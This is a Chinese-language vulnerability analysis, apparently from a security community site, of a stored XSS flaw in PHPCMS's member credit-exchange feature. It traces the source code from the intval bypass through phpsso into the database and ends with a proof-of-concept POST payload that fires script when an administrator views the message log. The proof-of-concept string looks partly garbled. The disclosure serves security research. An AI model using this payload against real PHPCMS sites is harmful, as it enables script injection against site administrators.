@@ -1,0 +1,153 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="7ced61a64fbfd9076b7365c38021bdcd">简介：</h1>
+<p>PHPCMS是一款网站管理软件。<br/>
+这个漏洞很久以前在乌云发过，不过到现在都没有修复，觉得还是比较经典的，分享一下。</p>
+<h1 data-content="1" id="9a5c53238e7be5682f5af6491bde41c6">漏洞分析：</h1>
+<p>问题出在会员的积分兑换功能，文件：</p>
+<pre><code>/phpcms/modules/member/index.php
+ public function change_credit() {
+  $memberinfo = $this-&gt;memberinfo;
+  //加载用户模块配置
+  $member_setting = getcache('member_setting');
+  $this-&gt;_init_phpsso();
+  $setting = $this-&gt;client-&gt;ps_getcreditlist();
+  $outcredit = unserialize($setting);
+  $setting = $this-&gt;client-&gt;ps_getapplist();
+  $applist = unserialize($setting);
+
+  if(isset($_POST['dosubmit'])) {
+   //本系统积分兑换数
+   $fromvalue = intval($_POST['fromvalue']);
+   //本系统积分类型
+   $from = $_POST['from'];
+   $toappid_to = explode('_', $_POST['to']);      //这个是问题的参数
+   //目标系统appid
+   $toappid = $toappid_to[0];
+   //目标系统积分类型
+   $to = $toappid_to[1];
+   if($from == 1) {
+    if($memberinfo['point'] &lt; $fromvalue) {
+     showmessage(L('need_more_point'), HTTP_REFERER);
+    }
+   } elseif($from == 2) {
+    if($memberinfo['amount'] &lt; $fromvalue) {
+     showmessage(L('need_more_amount'), HTTP_REFERER);
+    }
+   } else {
+    showmessage(L('credit_setting_error'), HTTP_REFERER);
+   }
+
+   $status = $this-&gt;client-&gt;ps_changecredit($memberinfo['phpssouid'], $from, $toappid, $to, $fromvalue);</code></pre>
+<p>这里有个问题，由于<code>if($memberinfo['point'] &lt; $fromvalue)</code>所以，<code>$fromvalue</code>不能大于会员的点数，但是没充值的状态下，点数是为0的，但是又由于上面有<code>intval($fromvalue)</code>，所以我们可以<code>$fromvalue=0.9</code>经过<code>intval</code>后就成了<code>0</code>，也就绕过了上面的逻辑。<br/>
+跟进<code>ps_changecredit</code>函数：</p>
+<pre><code>public function ps_changecredit($uid, $from, $toappid, $to, $credit) {
+  return $this-&gt;_ps_send('changecredit', array('uid'=&gt;$uid, 'from'=&gt;$from, 'toappid'=&gt;$toappid, 'to'=&gt;$to, 'credit'=&gt;$credit));
+ }</code></pre>
+<p>继续跟进<code>_ps_send</code>函数：</p>
+<pre><code>private function _ps_send($action, $data = null) {
+   return $this-&gt;_ps_post($this-&gt;ps_api_url."/index.php?m=phpsso&amp;c=index&amp;a=".$action, 500000, $this-&gt;auth_data($data));
+ }</code></pre>
+<p>最后是经过<code>auth_data</code>函数处理和加密，<code>auth_data</code>调用<code>sys_auth</code>加密函数进行加密:</p>
+<pre><code>public function auth_data($data) {
+  $s = $sep = '';
+  foreach($data as $k =&gt; $v) {
+   if(is_array($v)) {
+    $s2 = $sep2 = '';
+    foreach($v as $k2 =&gt; $v2) {
+      $s2 .= "$sep2{$k}[$k2]=".$this-&gt;_ps_stripslashes($v2);
+     $sep2 = '&amp;';
+    }
+    $s .= $sep.$s2;
+   } else {
+    $s .= "$sep$k=".$this-&gt;_ps_stripslashes($v);
+   }
+   $sep = '&amp;';
+  }
+
+  $auth_s = 'v='.$this-&gt;ps_vsersion.'&amp;appid='.APPID.'&amp;data='.urlencode($this-&gt;sys_auth($s));
+  return $auth_s;
+ }</code></pre>
+<p><code>_ps_post</code>函数主要就是让服务器访问自己的网站上的一个地址<br/>
+也就是访问了<code>phpsso</code>的<code>changecredit</code>函数（方法）。<br/>
+我们先来看看<code>phpsso</code>：</p>
+<pre><code>class phpsso {
+
+ public $db, $settings, $applist, $appid, $data;
+ /**
+  * 构造函数
+  */
+ public function __construct() {
+  $this-&gt;db = pc_base::load_model('member_model');
+  pc_base::load_app_func('global');
+
+  /*获取系统配置*/
+  $this-&gt;settings = getcache('settings', 'admin');
+  $this-&gt;applist = getcache('applist', 'admin');
+
+  if(isset($_GET) &amp;&amp; is_array($_GET) &amp;&amp; count($_GET) &gt; 0) {
+   foreach($_GET as $k=&gt;$v) {
+    if(!in_array($k, array('m','c','a'))) {
+     $_POST[$k] = $v;
+    }
+   }
+  }
+
+  if(isset($_POST['appid'])) {
+   $this-&gt;appid = intval($_POST['appid']);
+  } else {
+   exit('0');
+  }
+
+  if(isset($_POST['data'])) {
+   parse_str(sys_auth($_POST['data'], 'DECODE', $this-&gt;applist[$this-&gt;appid]['authkey']), $this-&gt;data);
+
+
+parse_str(sys_auth($_POST['data'], 'DECODE', $this-&gt;applist[$this-&gt;appid]['authkey']), $this-&gt;data);可以看到是通过sys_auth函数解密（加密跟解密的函数是一样的）。
+最后来看看changecredit：
+ public function changecredit() {
+  $this-&gt;uid = isset($this-&gt;data['uid']) ? $this-&gt;data['uid'] : exit('0');
+  $this-&gt;toappid = isset($this-&gt;data['toappid']) ? $this-&gt;data['toappid'] : exit('0');
+  $this-&gt;from = isset($this-&gt;data['from']) ? $this-&gt;data['from'] : exit('0');
+  $this-&gt;to = isset($this-&gt;data['to']) ? $this-&gt;data['to'] : exit('0');
+  $this-&gt;credit = isset($this-&gt;data['credit']) ? $this-&gt;data['credit'] : exit('0');
+  $this-&gt;appname = $this-&gt;applist[$this-&gt;appid]['name'];
+  $outcredit = $this-&gt;getcredit(1);
+  //目标系统积分增加数
+  $this-&gt;credit = floor($this-&gt;credit * $outcredit[$this-&gt;from.'_'.$this-&gt;to]['torate'] / $outcredit[$this-&gt;from.'_'.$this-&gt;to]['fromrate']);
+
+  /*插入消息队列*/
+  $noticedata['appname'] = $this-&gt;appname;
+  $noticedata['uid'] = $this-&gt;uid;
+  $noticedata['toappid'] = $this-&gt;toappid;
+  $noticedata['totypeid'] = $this-&gt;to;
+  $noticedata['credit'] = $this-&gt;credit;
+  messagequeue::add('change_credit', $noticedata);
+  exit('1');
+ }
+
+
+这里是进入数据库了：messagequeue::add('change_credit', $noticedata);
+ public static function add($operation, $noticedata_send) {
+  $db = self::get_db();
+  $noticedata_send['action'] = $operation;
+  $noticedata_send_string = array2string($noticedata_send);
+
+  if ($noticeid = $db-&gt;insert(array('operation'=&gt;$operation, 'noticedata'=&gt;$noticedata_send_string, 'dateline'=&gt;SYS_TIME), 1)) {
+   self::notice($operation, $noticedata_send, $noticeid);
+   return 1;
+  } else {
+   return 0;
+  }
+ }</code></pre>
+<p>调用insert写入数据。。这里就不跟了。由于系统开启了gpc（两次，初始化一次，phpsso一次），所以进去的数据是经过两次gpc的<br/>
+输出跟模板就不说了，反正没过滤直接出来</p>
+<p>整理一下思路，先从积分兑换填写表单，然后将数据整理成数组经过<code>sys_auth</code>加密一次，然后服务器发送数据包给自己，收到数据包之后用<code>sys_auth</code>函数解密，然后调用<code>changecredit</code>方法，<code>inert</code>插入数据库，然后管理员在后台点击通信信息的时候触发xss!</p>
+<h1 data-content="1" id="e6f8a91d36c7879c4996d7da0b2e0721">漏洞证明：</h1>
+<p>利用方法，先注册一个帐号，然后登录，然后访问:<br/>
+<a href="http://localhost/index.php?m=member&amp;c=index&amp;a=change_credit&amp;" target="_blank">http://localhost/index.php?m=member&amp;c=index&amp;a=change_credit&amp;</a><br/>
+post:</p>
+<pre><code>dosubmit=1&amp;fromvalue=0.6&amp;from=1id=1`setset'&amp;to=}" onmousemove=alert(1)&gt;//</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20171227180755-cedd88b8-eaed-1.png"/></p>
+</div>
+</div>
